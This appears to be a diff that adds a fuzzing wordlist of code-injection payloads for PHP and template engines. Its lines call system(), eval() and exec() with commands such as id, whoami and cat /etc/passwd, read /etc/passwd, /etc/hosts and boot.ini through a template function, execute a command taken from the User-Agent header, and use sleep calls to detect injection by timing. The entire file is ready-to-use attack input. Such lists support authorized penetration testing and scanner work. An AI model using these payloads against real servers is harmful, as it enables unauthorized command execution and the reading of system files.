@@ -1,0 +1,19 @@
+:phpversion();
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{ get_user_file("/etc/passwd") }}
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+eval('ls')
+eval('pwd');
+eval('sleep 5');
+eval('whoami');
+exec('ls')
+exec('pwd');
+exec('sleep 5');
+exec('whoami');
